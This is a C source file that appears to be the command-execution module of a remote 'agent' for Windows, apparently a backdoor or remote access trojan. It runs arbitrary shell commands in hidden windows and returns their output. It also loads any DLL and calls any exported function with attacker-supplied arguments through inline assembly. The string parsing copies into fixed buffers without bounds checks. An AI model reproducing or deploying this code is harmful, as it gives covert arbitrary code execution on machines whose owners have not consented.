#include "agent.h"

#define BUF_LEN 10240

DWORD CommandShell(LPSTR cmd, LPSTR response)
{
	if (cmd[0] == '*')
	{
		CallFunction(cmd, response);
		return strlen(response) + 1;
	}

	SECURITY_ATTRIBUTES saAttr;

	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	HANDLE hRead, hWrite;
	CreatePipe(&hRead, &hWrite, &saAttr, BUF_LEN);

	STARTUPINFOA stInfo;
	ZeroMemory(&stInfo, sizeof(STARTUPINFOA));
	stInfo.hStdOutput = hWrite;
	stInfo.hStdError = hWrite;
	stInfo.dwFlags |= STARTF_USESTDHANDLES;
	PROCESS_INFORMATION procInfo;

	if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &stInfo, &procInfo))
	{
		ExecCmd(cmd, response);
		return strlen(response) + 1;
	}

	DWORD bytesRead = 0;
	CHAR rdBuf[BUF_LEN];

	Sleep(200);

	while (GetFileSize(hRead, NULL))
	{
		ZeroMemory(rdBuf, BUF_LEN);
		BOOL bSuccess = ReadFile(hRead, rdBuf, BUF_LEN - 1, &bytesRead, NULL);

		if (!bSuccess || bytesRead == 0)
			break;

		strcat_s(response, BUF_LEN, rdBuf);
	}

	CloseHandle(hRead);
	CloseHandle(hWrite);

	if (strlen(response) == 0)
		snprintf(response, BUF_LEN, "Success (no output)!");
	else
		OemToCharA(response, response);

	return strlen(response) + 1;
}

VOID ExecCmd(LPSTR cmd, LPSTR output)
{
	CHAR tmp[256];
	GetTempPathA(256, tmp);
	strcat_s(tmp, BUF_LEN, "\\out");
	strcat_s(cmd, BUF_LEN, " > ");
	strcat_s(cmd, BUF_LEN, tmp);

	INT sysRetn = system(cmd);
	HANDLE hOut = CreateFileA(tmp, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hOut == INVALID_HANDLE_VALUE)
	{
		snprintf(output, BUF_LEN, "cmd returned %d", sysRetn);
		return;
	}

	DWORD bytesRead = 0;
	ReadFile(hOut, output, BUF_LEN, &bytesRead, NULL);

	CloseHandle(hOut);
	DeleteFileA(tmp);

	if (bytesRead == 0)
	{
		snprintf(output, BUF_LEN, "cmd returned %d", sysRetn);
		return;
	}

	OemToCharA(output, output);
}

INT GetLiteralNumber(char c)
{
	switch (c)
	{
	case '!':
		return 1;
	case '(':
		return 2;
	case ')':
		return 3;
	case ' ':
		return 4;
	case ':':
		return 5;
	case ',':
		return 6;
	case '"':
		return 7;
	case 0:
		return 8;
	default:
		return 0;
	}
}

INT CheckCallString(LPSTR callStr)
{
	static INT ctrlTable[11][9];

	for (int i = 0; i < 11; i++)
		for (int j = 0; j < 9; j++)
			ctrlTable[i][j] = -1;

	for (int i = 0; i < 9; i++)
		ctrlTable[9][i] = 9;

	ctrlTable[1][0] = 2;
	ctrlTable[2][0] = 2;
	ctrlTable[2][1] = 3;
	ctrlTable[3][0] = 4;
	ctrlTable[4][0] = 4;
	ctrlTable[4][2] = 5;
	ctrlTable[5][0] = 6;
	ctrlTable[5][3] = 0;
	ctrlTable[6][0] = 6;
	ctrlTable[6][5] = 7;
	ctrlTable[7][0] = 8;
	ctrlTable[7][7] = 9;
	ctrlTable[8][0] = 8;
	ctrlTable[8][3] = 0;
	ctrlTable[8][6] = 5;
	ctrlTable[9][7] = 10;
	ctrlTable[9][8] = -1;
	ctrlTable[10][3] = 0;
	ctrlTable[10][6] = 5;

	INT q = 1;

	while (q > 0)
	{
		q = ctrlTable[q][GetLiteralNumber(callStr[0])];
		++callStr;
	}

	return q;
}

typedef struct _ARG
{
	char type[16];
	char value[256];
} ARG, * PARG;

VOID CallFunction(LPSTR callStr, LPSTR resltStr)
{
	++callStr;

	if (CheckCallString(callStr) != 0)
	{
		snprintf(resltStr, BUF_LEN, "Invalid syntax\n"
			"Usage example:\n"
			"*Lib_Name!Funct_Name(INT:-123,FLOAT:45.678,LPSTR:\"string, with symbols?\")\n"
			"NOTE: 1.Arguments list can be empty.\n"
			"      2.Spaces can ONLY be contained in the string constants\n"
			"INT   - signed integer number\n"
			"FLOAT - floating point number\n"
			"LPSTR - Multi-Byte character string");

		return;
	}

	CHAR lib[256];
	CHAR func[256];
	int pos = 0;

	while (callStr[0] != '!')
	{
		lib[pos] = callStr[0];
		++callStr;
		++pos;
	}

	++callStr;
	lib[pos] = 0;
	pos = 0;

	while (callStr[0] != '(')
	{
		func[pos] = callStr[0];
		++callStr;
		++pos;
	}

	++callStr;
	func[pos] = 0;
	pos = 0;

	ARG argList[16];
	INT argNum = 0;
	BOOL isStr = 0;

	while (callStr[0] != ')')
	{
		while (callStr[0] != ':')
		{
			argList[argNum].type[pos] = callStr[0];
			++callStr;
			++pos;
		}

		++callStr;
		argList[argNum].type[pos] = 0;
		pos = 0;

		if (callStr[0] == '"')
		{
			isStr = TRUE;
			++callStr;
		}
		else
			isStr = FALSE;

		while ((callStr[0] != ',' && callStr[0] != ')' && !isStr) ||
			(callStr[0] != '"' && isStr))
		{
			argList[argNum].value[pos] = callStr[0];
			++callStr;
			++pos;
		}

		if (isStr)
			++callStr;

		argList[argNum].value[pos] = 0;
		++argNum;

		if (callStr[0] == ')')
			continue;

		++callStr;
		pos = 0;
	}

	DWORD argStack[16];

	for (int i = 0; i < argNum; i++)
	{
		if (strcmp(argList[i].type, "INT") == 0)
		{
			argStack[i] = atoi(argList[i].value);
			continue;
		}

		if (strcmp(argList[i].type, "FLOAT") == 0)
		{
			float f;

			if (_atoflt((_CRT_FLOAT*)&f, argList[i].value) != 0)
				f = 0.0;

			PDWORD pdw = (PDWORD)&f;
			argStack[i] = *pdw;
			continue;
		}

		if (strcmp(argList[i].type, "LPSTR") == 0)
		{
			argStack[i] = (DWORD)(argList[i].value);
			continue;
		}

		snprintf(resltStr, BUF_LEN, "Invalid type: %s\n"
			"Supported types:\n"
			"INT   - signed integer number\n"
			"FLOAT - floating point number\n"
			"LPSTR - Multi-Byte character string", argList[i].type);

		return;
	}

	HMODULE hLib = LoadLibraryA(lib);
	PVOID p_func = GetProcAddress(hLib, func);
	DWORD argStackAddr = (DWORD)&argStack[0], retValue;

	if (p_func == NULL)
	{
		snprintf(resltStr, BUF_LEN, "Can't find function %s in module %s", func, lib);
		return;
	}

	__asm
	{
		mov ecx, argNum;
		mov edx, argStackAddr;
	L1:
		test ecx, ecx;
		jz L2;
		sub ecx, 1;
		push DWORD PTR[edx + ecx * 4]
			jmp L1;
	L2:
		call p_func;
		mov retValue, eax;
	}

	snprintf(resltStr, BUF_LEN, "Return value = %d (0x%x)", retValue, retValue);

	return;
}
